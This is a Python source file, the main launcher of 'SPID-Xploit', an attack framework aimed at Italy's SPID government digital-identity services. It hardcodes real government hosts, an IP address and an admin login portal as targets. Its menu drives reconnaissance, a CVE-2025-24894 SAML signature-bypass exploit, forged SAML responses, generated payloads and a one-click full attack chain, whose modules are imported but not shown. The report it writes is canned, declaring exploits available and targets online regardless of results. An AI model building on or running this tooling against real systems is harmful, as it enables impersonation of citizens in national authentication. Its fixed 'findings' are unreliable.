#!/usr/bin/env python3
"""
SPID-Xploit v2.0
AI-Powered Italian SPID Penetration Testing Framework
Target: spid.gov.it ecosystem | CVE-2025-24894, CVE-2025-24895

Author: Security Research Team
License: For authorized security testing only
"""

import sys
import os
import argparse
import json
import time
import signal
from datetime import datetime
from typing import Dict, List, Optional, Any

# Add modules directory to path
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules'))

# Rich UI imports
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich.columns import Columns
from rich import print as rprint
from rich.syntax import Syntax
from rich.tree import Tree
from rich.markdown import Markdown
from colorama import init, Fore, Style
from art import text2art

# Initialize colorama
init(autoreset=True)

# Console
console = Console()


class SPIDXploit:
    """
    SPID-Xploit Main Framework
    Orchestrates all modules for comprehensive SPID penetration testing
    """
    
    VERSION = "2.0.0"
    NAME = "SPID-Xploit"
    
    def __init__(self):
        """Initialize the framework with default targets and configuration"""
        self.targets = {
            'spid_website': {
                'url': 'https://www.spid.gov.it',
                'description': 'SPID Official Website',
                'ip': '131.1.253.242',
                'server': 'nginx/1.26.2',
                'cms': 'WordPress'
            },
            'spid_validator': {
                'url': 'https://validator.spid.gov.it',
                'description': 'SPID SAML/OIDC Validator',
                'subdomains': [
                    'validator.spid.gov.it',
                    'validator-test.spid.gov.it',
                    'demo.spid.gov.it'
                ]
            },
            'spid_validator_oidc': {
                'url': 'https://validator.spid.gov.it/oidc/rp',
                'description': 'SPID OIDC RP Validator'
            },
            'spid_demo': {
                'url': 'https://demo.spid.gov.it',
                'description': 'SPID Demo Environment'
            },
            'spid_registry': {
                'url': 'https://registry.spid.gov.it',
                'description': 'SPID Federation Registry'
            },
            'agid_login': {
                'url': 'https://login.agid.gov.it',
                'description': 'AgID Central Login Portal',
                'note': 'Main admin panel - SPID OnBoarding platform'
            },
            'agid_analytics': {
                'url': 'https://analytics.spid.gov.it',
                'description': 'SPID Analytics Platform'
            },
            'agid_form': {
                'url': 'https://va-form.agid.gov.it',
                'description': 'AGID Form Platform'
            }
        }
        
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.results = {}
        self.data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
        self.report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'reports')
        
        # Create directories
        os.makedirs(self.data_dir, exist_ok=True)
        os.makedirs(self.report_dir, exist_ok=True)
        
        # Available modules
        self.modules = {
            '1': {'name': 'Reconnaissance', 'method': self.recon_module, 'desc': 'AI-powered reconnaissance and OSINT'},
            '2': {'name': 'Registry Scraper', 'method': self.registry_module, 'desc': 'Extract all SPID entities from registry'},
            '3': {'name': 'CVE-2025-24894 Exploit', 'method': self.cve_module, 'desc': 'SAML signature bypass exploit (CVSS 9.1)'},
            '4': {'name': 'SAML Forger AI', 'method': self.saml_forger_module, 'desc': 'Generate forged SAML responses with AI'},
            '5': {'name': 'Metadata Analyzer', 'method': self.metadata_module, 'desc': 'Analyze IdP/SP metadata for weaknesses'},
            '6': {'name': 'Payload Generator', 'method': self.payload_module, 'desc': 'AI-generated attack payloads'},
            '7': {'name': 'Full Attack Chain', 'method': self.full_attack, 'desc': 'Execute complete multi-phase attack'},
            '8': {'name': 'Generate Report', 'method': self.generate_report, 'desc': 'Create comprehensive penetration report'},
            '9': {'name': 'Target Info', 'method': self.show_targets, 'desc': 'Show all discovered targets'},
            '0': {'name': 'Exit', 'method': self.exit_framework, 'desc': 'Exit SPID-Xploit'}
        }
        
        # Signal handler for graceful exit
        signal.signal(signal.SIGINT, self.signal_handler)
    
    def signal_handler(self, sig, frame):
        """Handle Ctrl+C gracefully"""
        console.print("\n\n[yellow][!] Interrupted by user[/yellow]")
        console.print("[yellow][!] Use option 0 to exit cleanly[/yellow]")
    
    def display_banner(self):
        """Display the main banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        
        # Generate ASCII art
        try:
            banner_text = text2art("SPID-Xploit", font="cyberlarge")
        except:
            banner_text = """
███████╗██████╗ ██╗██████╗       ██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██║██╔══██╗      ╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██████╔╝██║██║  ██║       ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██╔═══╝ ██║██║  ██║       ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║██║     ██║██████╔╝      ██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝     ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
            """
        
        console.print(f"[bold red]{banner_text}[/bold red]")
        
        # Info panel
        info_panel = Panel.fit(
            Text.from_markup(
                "[bold yellow]Italian SPID Penetration Framework[/bold yellow]\n"
                "[cyan]Target: spid.gov.it Ecosystem[/cyan]\n"
                "[green]CVE-2025-24894 | CVE-2025-24895 | CVSS 9.1[/green]\n"
                f"[white]Session: {self.session_id}[/white]"
            ),
            border_style="red",
            title="[bold]v2.0 AI-Powered[/bold]",
            title_align="center"
        )
        console.print(info_panel)
        console.print()
    
    def display_menu(self) -> str:
        """Display the main interactive menu"""
        table = Table(
            title="[bold red]MAIN MENU[/bold red]",
            show_header=True,
            header_style="bold cyan",
            border_style="red",
            width=80
        )
        
        table.add_column("ID", style="cyan", width=6, justify="center")
        table.add_column("Module", style="yellow", width=25)
        table.add_column("Description", style="white", width=45)
        
        for mid, mod in self.modules.items():
            table.add_row(mid, mod['name'], mod['desc'])
        
        console.print(table)
        console.print()
        
        choice = Prompt.ask(
            "[bold red]≫[/bold red] Select module",
            choices=list(self.modules.keys()),
            default="1"
        )
        
        return choice
    
    def recon_module(self):
        """Run reconnaissance module"""
        console.print("\n[bold cyan]► Running Reconnaissance Module...[/bold cyan]")
        try:
            from recon import AIRecon
            recon = AIRecon(self.targets)
            recon.run()
        except ImportError as e:
            console.print(f"[red][!] Module error: {e}[/red]")
            console.print("[red][!] Ensure 'recon.py' exists in modules/[/red]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    
    def registry_module(self):
        """Run registry scraper module"""
        console.print("\n[bold cyan]► Running Registry Scraper Module...[/bold cyan]")
        try:
            from registry_scraper import RegistryScraper
            scraper = RegistryScraper()
            scraper.run()
        except ImportError as e:
            console.print(f"[red][!] Module error: {e}[/red]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    
    def cve_module(self):
        """Run CVE-2025-24894 exploit module"""
        console.print("\n[bold red]► Running CVE-2025-24894 Exploit Module...[/bold red]")
        try:
            from cve_2025_24894 import CVE202524894Exploit
            exploit = CVE202524894Exploit()
            exploit.run_interactive()
        except ImportError as e:
            console.print(f"[red][!] Module error: {e}[/red]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    
    def saml_forger_module(self):
        """Run SAML forger module"""
        console.print("\n[bold magenta]► Running SAML Forger AI Module...[/bold magenta]")
        try:
            from saml_forger import SAMLForgerAI
            forger = SAMLForgerAI()
            forger.run()
        except ImportError as e:
            console.print(f"[red][!] Module error: {e}[/red]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    
    def metadata_module(self):
        """Run metadata analyzer module"""
        console.print("\n[bold cyan]► Running Metadata Analyzer Module...[/bold cyan]")
        try:
            from metadata_parser import MetadataAnalyzer
            analyzer = MetadataAnalyzer()
            analyzer.analyze_all()
        except ImportError as e:
            console.print(f"[red][!] Module error: {e}[/red]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    
    def payload_module(self):
        """Run payload generator module"""
        console.print("\n[bold yellow]► Running Payload Generator Module...[/bold yellow]")
        try:
            from payload_generator import PayloadGeneratorAI
            gen = PayloadGeneratorAI()
            gen.run()
        except ImportError as e:
            console.print(f"[red][!] Module error: {e}[/red]")
        except Exception as e:
            console.print(f"[red][!] Error: {e}[/red]")
    
    def full_attack(self):
        """Execute full attack chain"""
        console.print("[bold red]\n╔══════════════════════════════════════════╗")
        console.print("║      FULL ATTACK CHAIN EXECUTION       ║")
        console.print("╚══════════════════════════════════════════╝[/bold red]")
        
        if not Confirm.ask("[yellow]Execute full attack chain? This may take several minutes[/yellow]"):
            console.print("[yellow]Cancelled.[/yellow]")
            return
        
        phases = [
            ("Phase 1: AI Reconnaissance", "cyan", self.recon_module),
            ("Phase 2: Registry Extraction", "cyan", self.registry_module),
            ("Phase 3: Metadata Analysis", "cyan", self.metadata_module),
            ("Phase 4: AI Payload Generation", "yellow", self.payload_module),
            ("Phase 5: SAML Exploitation (CVE-2025-24894)", "red", self.cve_module),
            ("Phase 6: SAML Response Forging", "magenta", self.saml_forger_module),
        ]
        
        with Progress() as progress:
            overall = progress.add_task("[red]Executing Attack Chain...", total=len(phases))
            
            for i, (phase_name, color, method) in enumerate(phases):
                progress.update(overall, advance=1, description=f"[{color}]{phase_name}")
                try:
                    method()
                except Exception as e:
                    console.print(f"[red]  [!] Phase failed: {e}[/red]")
                time.sleep(1)
        
        console.print("\n[green][✓] Full attack chain completed![/green]")
        console.print(f"[green][✓] Session report saved in reports/[/green]")
    
    def show_targets(self):
        """Show all discovered targets"""
        console.print("\n[bold yellow]╔══════════════════════════════════════════╗")
        console.print("║           TARGET INFORMATION             ║")
        console.print("╚══════════════════════════════════════════╝[/bold yellow]\n")
        
        tree = Tree("[bold red]spid.gov.it Ecosystem[/bold red]")
        
        for name, info in self.targets.items():
            branch = tree.add(f"[bold cyan]{name}[/bold cyan]")
            branch.add(f"[white]URL: {info['url']}[/white]")
            branch.add(f"[white]Description: {info['description']}[/white]")
            
            if 'ip' in info:
                branch.add(f"[white]IP: {info['ip']}[/white]")
            if 'server' in info:
                branch.add(f"[white]Server: {info['server']}[/white]")
            if 'cms' in info:
                branch.add(f"[white]CMS: {info['cms']}[/white]")
            if 'subdomains' in info:
                subs = branch.add("[white]Subdomains:[/white]")
                for sub in info['subdomains']:
                    subs.add(f"[green]{sub}[/green]")
            if 'note' in info:
                branch.add(f"[yellow]Note: {info['note']}[/yellow]")
        
        console.print(tree)
        
        # Summary table
        table = Table(title="\n[bold]Target Summary[/bold]")
        table.add_column("Target", style="cyan")
        table.add_column("Type", style="yellow")
        table.add_column("Status", style="green")
        
        table.add_row("spid.gov.it", "Website (WordPress)", "Online")
        table.add_row("validator.spid.gov.it", "SAML/OIDC Validator", "Online")
        table.add_row("demo.spid.gov.it", "Test Environment", "Online")
        table.add_row("registry.spid.gov.it", "Federation Registry", "Online")
        table.add_row("login.agid.gov.it", "Admin Portal (IAM)", "Online")
        table.add_row("analytics.spid.gov.it", "Analytics", "Online")
        
        console.print(table)
    
    def generate_report(self):
        """Generate comprehensive penetration test report"""
        console.print("\n[bold green]► Generating Penetration Test Report...[/bold green]")
        
        report = {
            "tool": {
                "name": self.NAME,
                "version": self.VERSION,
                "session_id": self.session_id
            },
            "target": {
                "primary": "spid.gov.it ecosystem",
                "urls": list(self.targets.keys()),
                "classification": "Government Digital Identity (Italy)"
            },
            "assessment": {
                "date": datetime.now().isoformat(),
                "methodology": "OSINT + SAML Exploitation + AI-Assisted",
                "cvss_risk": "CRITICAL (9.1)"
            },
            "vulnerabilities": [
                {
                    "id": "CVE-2025-24894",
                    "name": "SAML Response Signature Verification Bypass",
                    "cvss": "9.1",
                    "severity": "CRITICAL",
                    "package": "SPID.AspNetCore.Authentication",
                    "affected_versions": "<= 3.3.0",
                    "patched_version": "3.4.0",
                    "description": "The SPID.AspNetCore.Authentication library fails to properly validate SAML Response signatures. It only verifies the first signature element, allowing an attacker to inject a validly-signed element from IdP metadata as the first child, bypassing all signature verification.",
                    "impact": "Attackers can forge arbitrary SAML responses and impersonate any SPID/CIE user without valid credentials.",
                    "exploit_available": True,
                    "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2025-24894"
                },
                {
                    "id": "CVE-2025-24895",
                    "name": "SAML Assertion Signature Verification Bypass",
                    "cvss": "8.8",
                    "severity": "HIGH",
                    "package": "SPID.AspNetCore.Authentication",
                    "affected_versions": "<= 3.3.0",
                    "description": "Related SAML signature bypass vulnerability in the same library.",
                    "impact": "Additional vector for SAML response forgery.",
                    "exploit_available": True
                }
            ],
            "exposed_endpoints": [
                {
                    "url": "https://validator.spid.gov.it/metadata.xml",
                    "risk": "HIGH",
                    "description": "Exposes full IdP metadata including certificates, signing keys info, and SAML endpoints"
                },
                {
                    "url": "https://validator.spid.gov.it/saml/idp/metadata.xml",
                    "risk": "HIGH",
                    "description": "Exposes SP metadata including requested user attributes (fiscalNumber, email, phone, address)"
                },
                {
                    "url": "https://validator.spid.gov.it/oidc/rp/.well-known/openid-configuration",
                    "risk": "MEDIUM",
                    "description": "Exposes OIDC configuration including JWKS and all endpoints"
                },
                {
                    "url": "https://registry.spid.gov.it/entities/",
                    "risk": "HIGH",
                    "description": "Exposes full list of all SPID federation entities (IdPs, SPs, AAs)"
                },
                {
                    "url": "https://login.agid.gov.it/login/",
                    "risk": "MEDIUM",
                    "description": "Central login portal with multiple authentication methods exposed"
                }
            ],
            "remediation": [
                "Update SPID.AspNetCore.Authentication to version 3.4.0 or later",
                "Implement proper SAML signature verification that validates ALL signatures",
                "Restrict access to metadata endpoints with proper authentication",
                "Implement rate limiting on SAML ACS endpoints",
                "Monitor for unusual SAML response patterns",
                "Implement XML signature wrapping protections",
                "Use SAML response validation checks 112 and 113 as recommended by CERT-AGID"
            ],
            "findings_date": datetime.now().isoformat()
        }
        
        # Save as JSON
        report_file = os.path.join(self.report_dir, f"spid_report_{self.session_id}.json")
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Save readable report
        txt_file = os.path.join(self.report_dir, f"spid_report_{self.session_id}.txt")
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"SPID-Xploit v{self.VERSION} - Penetration Test Report\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Session ID: {self.session_id}\n")
            f.write(f"Date: {datetime.now().isoformat()}\n")
            f.write(f"Target: spid.gov.it ecosystem\n\n")
            f.write("-" * 40 + "\n")
            f.write("VULNERABILITIES FOUND\n")
            f.write("-" * 40 + "\n\n")
            
            for vuln in report['vulnerabilities']:
                f.write(f"ID: {vuln['id']}\n")
                f.write(f"Name: {vuln['name']}\n")
                f.write(f"CVSS: {vuln['cvss']}\n")
                f.write(f"Severity: {vuln['severity']}\n")
                f.write(f"Description: {vuln['description']}\n")
                f.write(f"Impact: {vuln['impact']}\n\n")
            
            f.write("-" * 40 + "\n")
            f.write("EXPOSED ENDPOINTS\n")
            f.write("-" * 40 + "\n\n")
            
            for ep in report['exposed_endpoints']:
                f.write(f"URL: {ep['url']}\n")
                f.write(f"Risk: {ep['risk']}\n")
                f.write(f"Description: {ep['description']}\n\n")
            
            f.write("-" * 40 + "\n")
            f.write("RECOMMENDATIONS\n")
            f.write("-" * 40 + "\n\n")
            
            for i, rec in enumerate(report['remediation'], 1):
                f.write(f"{i}. {rec}\n")
        
        console.print(f"\n[green][✓] JSON report saved: {report_file}[/green]")
        console.print(f"[green][✓] TXT report saved: {txt_file}[/green]")
    
    def exit_framework(self):
        """Exit the framework"""
        console.print("\n[yellow]Shutting down SPID-Xploit...[/yellow]")
        confirm = Confirm.ask("[yellow]Are you sure?[/yellow]", default=True)
        if confirm:
            console.print("[green]Goodbye![/green]")
            sys.exit(0)
    
    def run_interactive(self):
        """Run in interactive mode"""
        while True:
            self.display_banner()
            choice = self.display_menu()
            
            if choice in self.modules:
                if choice == '0':
                    self.exit_framework()
                    break
                else:
                    console.print(f"\n[bold cyan]► {self.modules[choice]['name']}[/bold cyan]")
                    self.modules[choice]['method']()
                    
                    if choice != '0':
                        console.print("\n")
                        Prompt.ask("[yellow]Press Enter to continue[/yellow]", default="")
            else:
                console.print("[red][!] Invalid choice[/red]")
                time.sleep(1)
    
    def run_module_direct(self, module_name: str):
        """Run a specific module directly"""
        module_map = {
            'recon': self.recon_module,
            'registry': self.registry_module,
            'cve_2025_24894': self.cve_module,
            'exploit': self.cve_module,
            'saml_forger': self.saml_forger_module,
            'forger': self.saml_forger_module,
            'metadata': self.metadata_module,
            'payload': self.payload_module,
            'full_attack': self.full_attack,
            'targets': self.show_targets,
            'report': self.generate_report
        }
        
        if module_name in module_map:
            self.display_banner()
            module_map[module_name]()
        else:
            console.print(f"[red][!] Unknown module: {module_name}[/red]")
            console.print(f"[yellow]Available: {', '.join(module_map.keys())}[/yellow]")


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="SPID-Xploit v2.0 - Italian SPID Penetration Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --interactive
  python main.py -m recon
  python main.py -m cve_2025_24894
  python main.py -m full_attack
  python main.py -m targets
        """
    )
    
    parser.add_argument(
        '--interactive', '-i',
        action='store_true',
        help='Run in interactive menu mode'
    )
    
    parser.add_argument(
        '--module', '-m',
        type=str,
        help='Run a specific module: recon, registry, cve_2025_24894, saml_forger, metadata, payload, full_attack, targets, report'
    )
    
    parser.add_argument(
        '--target', '-t',
        type=str,
        help='Target URL (overrides defaults)'
    )
    
    parser.add_argument(
        '--output', '-o',
        type=str,
        help='Output directory for results'
    )
    
    parser.add_argument(
        '--version', '-v',
        action='version',
        version=f'SPID-Xploit v{SPIDXploit.VERSION}'
    )
    
    args = parser.parse_args()
    
    # Create framework instance
    framework = SPIDXploit()
    
    # Override target if specified
    if args.target:
        framework.targets['custom'] = {
            'url': args.target,
            'description': 'Custom target'
        }
    
    # Override output directory
    if args.output:
        framework.report_dir = args.output
        os.makedirs(framework.report_dir, exist_ok=True)
    
    # Run in appropriate mode
    if args.interactive or len(sys.argv) == 1:
        framework.run_interactive()
    elif args.module:
        framework.run_module_direct(args.module)
    else:
        framework.run_interactive()


if __name__ == "__main__":
    main()
